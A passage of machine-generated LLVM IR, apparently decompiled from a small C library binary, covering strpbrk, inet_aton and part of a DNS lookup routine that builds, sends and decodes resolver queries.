  uselistorder label %dec_label_pc_1857c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_18584 = load i32, i32* @r0, align 4
  %v1_185a82 = inttoptr i32 %v0_18584 to i8*
  %v2_185a83 = load i8, i8* %v1_185a82, align 1
  %v3_185a84 = zext i8 %v2_185a83 to i32
  %v2_185ac5 = icmp eq i8 %v2_185a83, 0
  br i1 %v2_185ac5, label %dec_label_pc_185a8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_185b4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1858c:                               ; preds = %dec_label_pc_18594
  %v1_1859c = add i32 %v0_1859c, 1
  %v9_1858c = icmp eq i32 %v3_18594, %v3_185a86
  br i1 %v9_1858c, label %dec_label_pc_185bc, label %dec_label_pc_18594

dec_label_pc_18594:                               ; preds = %dec_label_pc_1858c, %bb
  %v0_1859c = phi i32 [ %v1_1859c, %dec_label_pc_1858c ], [ %v0_185b4.pre, %bb ]
  %v1_18594 = inttoptr i32 %v0_1859c to i8*
  %v2_18594 = load i8, i8* %v1_18594, align 1
  %v3_18594 = zext i8 %v2_18594 to i32
  store i32 %v3_18594, i32* @ip, align 4
  %v2_18598 = icmp eq i8 %v2_18594, 0
  br i1 %v2_18598, label %dec_label_pc_185a4, label %dec_label_pc_1858c

dec_label_pc_185a4:                               ; preds = %dec_label_pc_18594
  %v1_185a4 = add i32 %v0_185a4, 1
  %v1_185a8 = inttoptr i32 %v1_185a4 to i8*
  %v2_185a8 = load i8, i8* %v1_185a8, align 1
  %v3_185a8 = zext i8 %v2_185a8 to i32
  %v2_185ac = icmp eq i8 %v2_185a8, 0
  br i1 %v2_185ac, label %dec_label_pc_185a8._crit_edge, label %bb

dec_label_pc_185a8._crit_edge:                    ; preds = %dec_label_pc_185a4, %entry
  %v3_185a8.lcssa = phi i32 [ %v3_185a84, %entry ], [ %v3_185a8, %dec_label_pc_185a4 ]
  ret i32 %v3_185a8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_185a4
  %v0_185a4 = phi i32 [ %v0_18584, %.lr.ph ], [ %v1_185a4, %dec_label_pc_185a4 ]
  %v3_185a86 = phi i32 [ %v3_185a84, %.lr.ph ], [ %v3_185a8, %dec_label_pc_185a4 ]
  br label %dec_label_pc_18594

dec_label_pc_185bc:                               ; preds = %dec_label_pc_1858c
  ret i32 %v0_185a4

; uselistorder directives
  uselistorder i32 %v3_185a8, { 1, 0 }
  uselistorder i32 %v3_18594, { 1, 0 }
  uselistorder i32 %v0_1859c, { 1, 0 }
  uselistorder i32 %v3_185a84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_18594, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_185c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_185c4 = icmp eq i32 %v0_185c4, 0
  %v3_185c8 = load i32, i32* @r4, align 4
  store i32 %v3_185c8, i32* %stack_var_-20, align 4
  br i1 %v2_185c4, label %dec_label_pc_186a4, label %dec_label_pc_185e0.lr.ph

dec_label_pc_185e0:                               ; preds = %dec_label_pc_185e0.lr.ph, %dec_label_pc_18664
  %v1_18664 = phi i32 [ 0, %dec_label_pc_185e0.lr.ph ], [ %v5_18664, %dec_label_pc_18664 ]
  %v0_18668 = phi i32 [ 1, %dec_label_pc_185e0.lr.ph ], [ %v1_18668, %dec_label_pc_18664 ]
  %v0_185e8 = phi i32 [ %v0_185c4, %dec_label_pc_185e0.lr.ph ], [ %v0_185e825, %dec_label_pc_18664 ]
  store i32 %v2_185e4.pre, i32* @lr, align 4
  %v1_185e8 = inttoptr i32 %v0_185e8 to i8*
  %v2_185e8 = load i8, i8* %v1_185e8, align 1
  %v3_185e8 = zext i8 %v2_185e8 to i32
  %v3_185ec = mul nuw nsw i32 %v3_185e8, 2
  %v4_185ec = add i32 %v3_185ec, %v2_185e4.pre
  %v5_185ec = inttoptr i32 %v4_185ec to i8*
  %v6_185ec = load i8, i8* %v5_185ec, align 1
  %v1_185f0 = and i8 %v6_185ec, 8
  %v2_185f0 = icmp eq i8 %v1_185f0, 0
  br i1 %v2_185f0, label %dec_label_pc_186a4, label %dec_label_pc_185f8

dec_label_pc_185f8:                               ; preds = %dec_label_pc_185e0
  br label %dec_label_pc_18618

dec_label_pc_18600:                               ; preds = %dec_label_pc_18618
  %v3_18604 = mul i32 %v0_18664, 10
  %v4_18604 = add i32 %v3_18618, %v3_18604
  %v1_18608 = add i32 %v4_18604, -48
  %v8_18610 = icmp sgt i32 %v1_18608, 255
  br i1 %v8_18610, label %dec_label_pc_186a4, label %dec_label_pc_18614

dec_label_pc_18614:                               ; preds = %dec_label_pc_18600
  %v1_18614 = add i32 %v0_18654, 1
  store i32 %v1_18614, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18618

dec_label_pc_18618:                               ; preds = %dec_label_pc_185f8, %dec_label_pc_18614
  %v0_18664 = phi i32 [ 0, %dec_label_pc_185f8 ], [ %v1_18608, %dec_label_pc_18614 ]
  %v0_18654 = phi i32 [ %v0_185e8, %dec_label_pc_185f8 ], [ %v1_18614, %dec_label_pc_18614 ]
  %v1_18618 = inttoptr i32 %v0_18654 to i8*
  %v2_18618 = load i8, i8* %v1_18618, align 1
  %v3_18618 = zext i8 %v2_18618 to i32
  %v2_1861c = mul nuw nsw i32 %v3_18618, 2
  %v2_18620 = add i32 %v2_1861c, %v2_185e4.pre
  %v3_18624 = inttoptr i32 %v2_18620 to i8*
  %v4_18624 = load i8, i8* %v3_18624, align 1
  %v6_18624 = zext i8 %v4_18624 to i32
  %v1_18630 = and i32 %v6_18624, 8
  %v2_18630 = icmp eq i32 %v1_18630, 0
  br i1 %v2_18630, label %dec_label_pc_18638, label %dec_label_pc_18600

dec_label_pc_18638:                               ; preds = %dec_label_pc_18618
  %v8_1863c = icmp sgt i32 %v0_18668, 3
  br i1 %v8_1863c, label %dec_label_pc_18650, label %dec_label_pc_18640

dec_label_pc_18640:                               ; preds = %dec_label_pc_18638
  %v7_18640 = icmp eq i8 %v2_18618, 46
  br i1 %v7_18640, label %dec_label_pc_18648, label %dec_label_pc_186a4

dec_label_pc_18648:                               ; preds = %dec_label_pc_18640
  %v1_18648 = add i32 %v0_18654, 1
  store i32 %v1_18648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18664

dec_label_pc_18650:                               ; preds = %dec_label_pc_18638
  %v2_18650 = icmp eq i8 %v2_18618, 0
  %v1_18654 = add i32 %v0_18654, 1
  store i32 %v1_18654, i32* %r0.global-to-local, align 4
  br i1 %v2_18650, label %dec_label_pc_18664, label %dec_label_pc_1865c

dec_label_pc_1865c:                               ; preds = %dec_label_pc_18650
  %v1_1865c = and i32 %v6_18624, 32
  %v2_1865c = icmp eq i32 %v1_1865c, 0
  br i1 %v2_1865c, label %dec_label_pc_186a4, label %dec_label_pc_18664

dec_label_pc_18664:                               ; preds = %dec_label_pc_1865c, %dec_label_pc_18650, %dec_label_pc_18648
  %v0_185e825 = phi i32 [ %v1_18654, %dec_label_pc_1865c ], [ %v1_18654, %dec_label_pc_18650 ], [ %v1_18648, %dec_label_pc_18648 ]
  %v4_18664 = mul i32 %v1_18664, 256
  %v5_18664 = or i32 %v0_18664, %v4_18664
  %v1_18668 = add nuw nsw i32 %v0_18668, 1
  %v7_18670 = icmp slt i32 %v1_18668, 5
  br i1 %v7_18670, label %dec_label_pc_185e0, label %dec_label_pc_18674

dec_label_pc_185e0.lr.ph:                         ; preds = %entry
  %v2_185e4.pre = load i32, i32* @global_var_26250, align 4
  br label %dec_label_pc_185e0

dec_label_pc_18674:                               ; preds = %dec_label_pc_18664
  %v2_18674 = icmp eq i32 %arg2, 0
  br i1 %v2_18674, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_18674
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_18674
  %v3_18690 = call i32 @llvm.bswap.i32(i32 %v5_18664)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1869c = inttoptr i32 %arg2 to i32*
  store i32 %v3_18690, i32* %v3_1869c, align 4
  %v2_186a0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_186a0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_186a0 = phi i32 [ 1, %bb ], [ %v17_186a0.pre, %bb41 ]
  %v2_186a0 = phi i32 [ %v3_185c8, %bb ], [ %v2_186a0.pre, %bb41 ]
  store i32 %v2_186a0, i32* @r4, align 4
  ret i32 %v17_186a0

dec_label_pc_186a4:                               ; preds = %dec_label_pc_18640, %dec_label_pc_1865c, %dec_label_pc_185e0, %dec_label_pc_18600, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_185c8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_185e4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_18668, { 1, 0 }
  uselistorder i32 %v0_18654, { 0, 1, 3, 2 }
  uselistorder i32 %v3_185c8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_186a4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18618, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp145 = call i32 @__decompiler_undefined_function_0()
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp150 = call i32 @__decompiler_undefined_function_0()
  %tmp154 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_186b0 = load i32, i32* @r4, align 4
  %v6_186b0 = load i32, i32* @r5, align 4
  %v9_186b0 = load i32, i32* @r6, align 4
  %v12_186b0 = load i32, i32* @r7, align 4
  %v15_186b0 = load i32, i32* @r8, align 4
  %v18_186b0 = load i32, i32* @sb, align 4
  %v21_186b0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_186d0 = call i32 @malloc(i32 512)
  store i32 %v1_186d0, i32* @r7, align 4
  %v1_186dc = call i32 @malloc(i32 1025)
  %v2_186e0 = icmp eq i32 %v1_186dc, 0
  br i1 %v2_186e0, label %.thread7, label %bb

bb:                                               ; preds = %entry
  %v1_186e4 = load i32, i32* @r7, align 4
  %v3_186e4 = icmp eq i32 %v1_186e4, 0
  store i32 %v1_186dc, i32* %stack_var_-236, align 4
  br i1 %v3_186e4, label %bb194, label %dec_label_pc_186f8

.thread7:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_18dd8

bb194:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_18dd8

dec_label_pc_186f8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_186fc = icmp eq i32 %arg3, 0
  br i1 %v2_186fc, label %dec_label_pc_18dd8, label %dec_label_pc_18704

dec_label_pc_18704:                               ; preds = %dec_label_pc_186f8
  %v2_18708 = load i8, i8* %arg1, align 1
  %v2_1870c = icmp eq i8 %v2_18708, 0
  br i1 %v2_1870c, label %dec_label_pc_18dd8, label %dec_label_pc_18714

dec_label_pc_18714:                               ; preds = %dec_label_pc_18704
  %v3_18718 = call i32 @strlen(i8* nonnull %arg1)
  %v2_18720 = add i32 %v3_18718, %tmp
  %v1_18724 = add i32 %v2_18720, -1
  %v2_18724 = inttoptr i32 %v1_18724 to i8*
  %v3_18724 = load i8, i8* %v2_18724, align 1
  %v2_18728 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18728, i32* @r4, align 4
  %v7_1872c = icmp eq i8 %v3_18724, 46
  %. = zext i1 %v7_1872c to i32
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18750 = call i32 @__pthread_return_void()
  %v1_18760 = call i32 @__pthread_return_0()
  %v2_1876c = load i32, i32* @global_var_2c840.1111, align 4
  %v2_18770 = srem i32 %v2_1876c, %arg3
  %v3_18778 = load i8, i8* @global_var_26591.1114, align 1
  %v4_18778 = zext i8 %v3_18778 to i32
  %v2_1877c = load i8, i8* bitcast (i8** @global_var_26590.1113 to i8*), align 4
  %v3_1877c = zext i8 %v2_1877c to i32
  %v4_18784 = mul nuw nsw i32 %v4_18778, 256
  %v5_18784 = or i32 %v3_1877c, %v4_18784
  store i32 %v5_18784, i32* @sb, align 4
  store i32 %v2_18770, i32* @sl, align 4
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18798 = call i32 @__pthread_return_void()
  %v0_187a4 = load i32, i32* @r5, align 4
  %v2_187c4 = ptrtoint i8* %stack_var_-188 to i32
  %v6_18808 = bitcast i8* %stack_var_-188 to i32*
  %v2_188e8 = ptrtoint i32* %stack_var_-92 to i32
  %v3_18980 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_189e4 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_18d30 = icmp eq i1 %v7_1872c, false
  %v7_18a38 = icmp eq i32 %tmp155, 3
  %tmp197 = icmp slt i32 %tmp154, 1
  %v2_18b1c = ptrtoint i32* %stack_var_-140 to i32
  %v9_18c14 = icmp eq i32 %tmp146, %arg2
  %v7_18ba8 = icmp eq i32 %arg2, 1
  %v2_18b50 = icmp eq i32 %tmp150, 0
  %tmp291 = icmp ult i32 %v0_187a4, 3
  br i1 %tmp291, label %dec_label_pc_187ac.lr.ph.preheader.lr.ph, label %dec_label_pc_18de4

dec_label_pc_187ac.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_18714
  %v2_18abc = icmp eq i32 %tmp155, 0
  %v8_18bac = icmp eq i32 %arg2, 28
  br label %dec_label_pc_187ac.lr.ph.preheader

dec_label_pc_187ac:                               ; preds = %dec_label_pc_187ac.lr.ph, %dec_label_pc_18dc8.backedge
  %v1_187b4 = phi i32 [ %stack_var_-216.1.ph83, %dec_label_pc_187ac.lr.ph ], [ %v0_1895c, %dec_label_pc_18dc8.backedge ]
  %stack_var_-208.566 = phi i32 [ %stack_var_-208.5.ph82, %dec_label_pc_187ac.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_18dc8.backedge ]
  %v7_187b0 = icmp eq i32 %v1_187b4, -1
  br i1 %v7_187b0, label %bb199, label %bb198

bb198:                                            ; preds = %dec_label_pc_187ac
  br label %bb199

bb199:                                            ; preds = %dec_label_pc_187ac, %bb198
  %v1_187b8 = xor i1 %v7_187b0, true
  call void @__pseudo_cond_branch(i1 %v1_187b8, i32 ptrtoint (i32* @global_var_12908.1116 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_187c4, i32* @r4, align 4
  %v0_187c8 = load i32, i32* @r7, align 4
  %v2_187cc = inttoptr i32 %v0_187c8 to i8*
  %v3_187cc = call i32 @__GI_memset(i8* %v2_187cc, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_187dc = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_187e0 = load i32, i32* @sb, align 4
  %v1_187e0 = add i32 %v0_187e0, 1
  %v3_187e8 = urem i32 %v1_187e0, 65536
  store i32 %v3_187e8, i32* @sb, align 4
  %v0_187f4 = load i32, i32* @r7, align 4
  %v5_18800 = trunc i32 %v1_187e0 to i8
  store i8 %v5_18800, i8* %stack_var_-188, align 1
  %v7_18808 = call i32 @__encode_header(i32* %v6_18808, i32 %v0_187f4, i32 512, i32 1, i32 %v1_187e0)
  store i32 %v7_18808, i32* @r5, align 4
  %v1_1880c = icmp slt i32 %v7_18808, 0
  br i1 %v1_1880c, label %dec_label_pc_18de4, label %dec_label_pc_18814

dec_label_pc_18814:                               ; preds = %bb199
  store i32 %tmp, i32* @r1, align 4
  %v2_1881c = load i32, i32* %stack_var_-236, align 4
  %v4_18820 = call i32 @strncpy(i32 %v2_1881c, i32 %tmp, i32 1025)
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18838 = call i32 @__pthread_return_void()
  %v1_18848 = call i32 @__pthread_return_0()
  %v1_18858 = load i32, i32* @sl, align 4
  %v4_18858 = mul i32 %v1_18858, 4
  %v5_18858 = add i32 %v4_18858, %arg4
  %v6_18858 = inttoptr i32 %v5_18858 to i32*
  %v7_18858 = load i32, i32* %v6_18858, align 4
  store i32 %v7_18858, i32* @r6, align 4
  br i1 %v1_18854, label %dec_label_pc_1889c, label %dec_label_pc_18860

dec_label_pc_18860:                               ; preds = %dec_label_pc_18814
  %v2_18868 = load i32, i32* @global_var_2c910.1119, align 4
  %v6_18870 = icmp slt i32 %v6_18d8c, %v2_18868
  br i1 %v6_18870, label %dec_label_pc_18874, label %dec_label_pc_1889c

dec_label_pc_18874:                               ; preds = %dec_label_pc_18860
  store i32 ptrtoint (i32* @global_var_1dc0c.1121 to i32), i32* @r1, align 4
  %v2_1887c = load i32, i32* %stack_var_-236, align 4
  %v4_18880 = inttoptr i32 %v2_1887c to i8*
  %v5_18880 = call i32 @__GI_strncat(i8* %v4_18880, i32 ptrtoint (i32* @global_var_1dc0c.1121 to i32), i32 1025, i32 %v2_18868)
  %v7_18890 = load i32, i32* %v6_18890, align 4
  store i32 %v7_18890, i32* @r1, align 4
  %v4_18898 = inttoptr i32 %v2_1887c to i8*
  %v5_18898 = call i32 @__GI_strncat(i8* %v4_18898, i32 %v7_18890, i32 1025, i32 ptrtoint (i32* @global_var_2c8f0.1123 to i32))
  br label %dec_label_pc_1889c

dec_label_pc_1889c:                               ; preds = %dec_label_pc_18860, %dec_label_pc_18814, %dec_label_pc_18874
  store i32 %v2_18728, i32* @r0, align 4
  store i32 100528, i32* @lr, align 4
  %v1_188ac = call i32 @__pthread_return_void()
  %v2_188b8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_188b8, i32* %stack_var_-56, align 4
  %v0_188c8 = load i32, i32* @r7, align 4
  %v1_188c8 = load i32, i32* @r5, align 4
  %v2_188c8 = add i32 %v1_188c8, %v0_188c8
  %v1_188cc = sub i32 512, %v1_188c8
  %v8_188d4 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_188c8, i32 %v1_188cc, i32 %arg2, i32 %v2_188b8, i32 %arg2, i32 1)
  store i32 %v8_188d4, i32* @fp, align 4
  %v1_188d8 = icmp slt i32 %v8_188d4, 0
  br i1 %v1_188d8, label %dec_label_pc_18de4, label %dec_label_pc_188e0

dec_label_pc_188e0:                               ; preds = %dec_label_pc_1889c
  store i32 0, i32* @r4, align 4
  %v0_188f0 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_188fc = inttoptr i32 %v0_188f0 to i8*
  %v4_188fc = call i32 @inet_pton(i32 10, i8* %v3_188fc, i32 %v2_188e8)
  %v1_18900 = load i32, i32* @r4, align 4
  %v7_18904 = icmp sgt i32 %v4_188fc, %v1_18900
  br i1 %v7_18904, label %bb200, label %dec_label_pc_188e0..thread10_crit_edge

dec_label_pc_188e0..thread10_crit_edge:           ; preds = %dec_label_pc_188e0
  %v3_18910.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread10

bb200:                                            ; preds = %dec_label_pc_188e0
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_188e0..thread10_crit_edge, %bb200
  %v3_18910 = phi i8 [ %v3_18910.pre, %dec_label_pc_188e0..thread10_crit_edge ], [ 10, %bb200 ]
  %v4_18910 = sext i8 %v3_18910 to i32
  %v8_1890c.op = urem i32 %v1_18900, 256
  %v8_1890c.op.op = mul nuw nsw i32 %v8_1890c.op, 256
  %v4_18918 = select i1 %v7_18904, i32 %v8_1890c.op.op, i32 0
  %v5_18918 = or i32 %v4_18910, %v4_18918
  %v7_1891c = icmp eq i32 %v5_18918, 10
  br i1 %v7_1891c, label %dec_label_pc_18948, label %dec_label_pc_18930

dec_label_pc_18930:                               ; preds = %.thread10
  %v0_18934 = load i32, i32* @r6, align 4
  store i32 %v0_18934, i32* @r0, align 4
  %v1_18940 = call i32 @inet_addr(i32 %v0_18934)
  br label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %.thread10, %dec_label_pc_18930
  %v0_1895c = call i32 @socket()
  %v1_18960 = icmp slt i32 %v0_1895c, 0
  br i1 %v1_18960, label %.thread, label %dec_label_pc_18978

.thread:                                          ; preds = %dec_label_pc_18948
  br label %dec_label_pc_18dc8.backedge

dec_label_pc_18dc8.backedge:                      ; preds = %.thread, %.thread12
  %stack_var_-208.5.be = add i32 %stack_var_-208.566, 1
  %tmp292 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp292, label %dec_label_pc_187ac, label %dec_label_pc_18de4

dec_label_pc_18978:                               ; preds = %dec_label_pc_18948
  %v4_18980 = call i32 @__libc_connect(i32 %v0_1895c, %sockaddr* nonnull %v3_18980, i32 28)
  %v1_18984 = icmp slt i32 %v4_18980, 0
  br i1 %v1_18984, label %dec_label_pc_1898c, label %dec_label_pc_189ac

dec_label_pc_1898c:                               ; preds = %dec_label_pc_18978
  %v0_1898c = call i32 @__errno_location()
  %v1_18990 = inttoptr i32 %v0_1898c to i32*
  %v2_18990 = load i32, i32* %v1_18990, align 4
  %v7_18994 = icmp eq i32 %v2_18990, 101
  br i1 %v7_18994, label %dec_label_pc_18cf8, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_1898c
  br label %dec_label_pc_18dc8.backedge

dec_label_pc_189ac:                               ; preds = %dec_label_pc_18978
  %v0_189ac = load i32, i32* @r5, align 4
  %v1_189ac = load i32, i32* @fp, align 4
  %v2_189ac = add i32 %v1_189ac, %v0_189ac
  %v0_189b0 = load i32, i32* @r7, align 4
  %v4_189bc = inttoptr i32 %v0_189b0 to i32*
  %v5_189bc = call i32 @__libc_send(i32 %v0_1895c, i32* %v4_189bc, i32 %v2_189ac, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_1895c, i32* %stack_var_-44, align 4
  %v11_189e4 = call i32 @__libc_poll(%pollfd* %v10_189e4, i32 1, i32 10000, i32 1, i32 %v0_1895c, i32 1, i32 0)
  %v1_189e8 = load i32, i32* @r4, align 4
  %v7_189ec = icmp sgt i32 %v11_189e4, %v1_189e8
  br i1 %v7_189ec, label %dec_label_pc_189f0, label %dec_label_pc_18cf8

dec_label_pc_189f0:                               ; preds = %dec_label_pc_189ac
  %v0_189f8 = load i32, i32* @r7, align 4
  %v5_18a00 = inttoptr i32 %v0_189f8 to i32*
  %v6_18a00 = call i32 @__libc_recv(i32 %v0_1895c, i32* %v5_18a00, i32 512, i32 %v1_189e8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_18a00, i32* @fp, align 4
  %v7_18a0c = icmp slt i32 %v6_18a00, 12
  br i1 %v7_18a0c, label %dec_label_pc_18d2c, label %dec_label_pc_18a10

dec_label_pc_18a10:                               ; preds = %dec_label_pc_189f0
  %v0_18a10 = load i32, i32* @r7, align 4
  %v2_18a18 = inttoptr i32 %v0_18a10 to i8*
  %v3_18a18 = call i32 @__decode_header(i8* %v2_18a18, i32 %v2_187c4)
  %v3_18a1c = load i8, i8* %stack_var_-188, align 1
  %v4_18a1c = sext i8 %v3_18a1c to i32
  store i32 %v4_18a1c, i32* @r6, align 4
  %v1_18a20 = load i32, i32* @sb, align 4
  %v9_18a20 = icmp eq i32 %v4_18a1c, %v1_18a20
  br i1 %v9_18a20, label %dec_label_pc_18a28, label %dec_label_pc_18d2c

dec_label_pc_18a28:                               ; preds = %dec_label_pc_18a10
  %v1_18a2c = load i32, i32* @r4, align 4
  %v9_18a2c = icmp eq i32 %tmp156, %v1_18a2c
  br i1 %v9_18a2c, label %dec_label_pc_18d2c, label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a28
  br i1 %v7_18a38, label %dec_label_pc_18a40, label %dec_label_pc_18abc

dec_label_pc_18a40:                               ; preds = %dec_label_pc_18a34
  %v9_18a44 = icmp eq i32 %., %v1_18a2c
  br i1 %v9_18a44, label %dec_label_pc_18a4c, label %dec_label_pc_18ab0

dec_label_pc_18a4c:                               ; preds = %dec_label_pc_18a40
  store i32 %v2_18728, i32* @r5, align 4
  store i32 %v2_18728, i32* @r0, align 4
  %v1_18a64 = call i32 @__pthread_return_void()
  %v1_18a74 = call i32 @__pthread_return_0()
  store i32 %v2_18728, i32* @r0, align 4
  %v2_18a80 = load i32, i32* @global_var_2c910.1119, align 4
  %v1_18a90 = call i32 @__pthread_return_void()
  %v1_18a98 = add i32 %v2_18a80, -1
  store i32 %v1_18a98, i32* @r4, align 4
  %v5_18aa0 = icmp slt i32 %v6_18d8c, %v1_18a98
  br i1 %v5_18aa0, label %.thread18, label %dec_label_pc_18ab0

.thread18:                                        ; preds = %dec_label_pc_18a4c
  %v7_18aa0 = add i32 %v6_18d8c, 1
  %v6_18aa4 = load i32, i32* @r6, align 4
  store i32 %v6_18aa4, i32* @sb, align 4
  br label %dec_label_pc_18dc8.outer.backedge

dec_label_pc_18ab0:                               ; preds = %dec_label_pc_18a4c, %dec_label_pc_18a40
  %v0_18ab0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18ae0

dec_label_pc_18abc:                               ; preds = %dec_label_pc_18a34
  br i1 %v2_18abc, label %dec_label_pc_18ac4, label %dec_label_pc_18d2c

dec_label_pc_18ac4:                               ; preds = %dec_label_pc_18abc
  br i1 %tmp197, label %dec_label_pc_18ad8, label %dec_label_pc_18af0.preheader

dec_label_pc_18af0.preheader:                     ; preds = %dec_label_pc_18ac4
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_18af0

dec_label_pc_18ad8:                               ; preds = %dec_label_pc_18ac4
  %v0_18ad8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18ab0, %dec_label_pc_18ad8
  %storemerge3 = phi i32 [ %v0_18ad8, %dec_label_pc_18ad8 ], [ %v0_18ab0, %dec_label_pc_18ab0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_18ad8 ], [ 1, %dec_label_pc_18ab0 ]
  %v2_18ae0 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_18ae0, align 4
  br label %dec_label_pc_18df4

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18af0
  %v2_18ae8 = call i32 @__length_question(i32 %v0_18afc, i32 %v0_18af8)
  %v0_18aec = load i32, i32* @r5, align 4
  %v2_18aec = add i32 %v0_18aec, %v2_18ae8
  store i32 %v2_18aec, i32* @r5, align 4
  %v0_18af4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18af0

dec_label_pc_18af0:                               ; preds = %dec_label_pc_18af0.preheader, %dec_label_pc_18ae8
  %v0_18af8 = phi i32 [ 12, %dec_label_pc_18af0.preheader ], [ %v2_18aec, %dec_label_pc_18ae8 ]
  %v0_18b00 = phi i32 [ 0, %dec_label_pc_18af0.preheader ], [ %v0_18af4.pre, %dec_label_pc_18ae8 ]
  store i32 %v0_18af8, i32* @r1, align 4
  %v0_18afc = load i32, i32* @r7, align 4
  store i32 %v0_18afc, i32* @r0, align 4
  %v1_18b00 = add i32 %v0_18b00, 1
  store i32 %v1_18b00, i32* @r4, align 4
  %v5_18b04 = icmp slt i32 %v0_18b00, 1
  br i1 %v5_18b04, label %dec_label_pc_18ae8, label %dec_label_pc_18b08

dec_label_pc_18b08:                               ; preds = %dec_label_pc_18af0
  br label %dec_label_pc_18c64

dec_label_pc_18b1c:                               ; preds = %bb204
  store i32 %v2_18b1c, i32* @r4, align 4
  %v0_18b20 = load i32, i32* @r7, align 4
  %v0_18b28 = load i32, i32* @fp, align 4
  %v5_18b30 = call i32 @__decode_answer(i32 %v0_18b20, i32 %v0_18b24, i32 %v0_18b28, i32* nonnull %stack_var_-140)
  %v1_18b34 = icmp slt i32 %v5_18b30, 0
  br i1 %v1_18b34, label %dec_label_pc_18b40, label %dec_label_pc_18b5c

dec_label_pc_18b40:                               ; preds = %dec_label_pc_18b1c
  %v2_18b44 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_18b44, label %dec_label_pc_18d2c, label %dec_label_pc_18b4c

dec_label_pc_18b4c:                               ; preds = %dec_label_pc_18b40
  br i1 %v2_18b50, label %dec_label_pc_18d2c, label %dec_label_pc_18c78

dec_label_pc_18b5c:                               ; preds = %dec_label_pc_18b1c
  %v2_18b60 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_18b60, label %dec_label_pc_18c04, label %dec_label_pc_18b68

dec_label_pc_18b68:                               ; preds = %dec_label_pc_18b5c
  %v0_18b68 = load i32, i32* @r8, align 4
  %v6_18b6c = add i32 %v0_18b68, 36
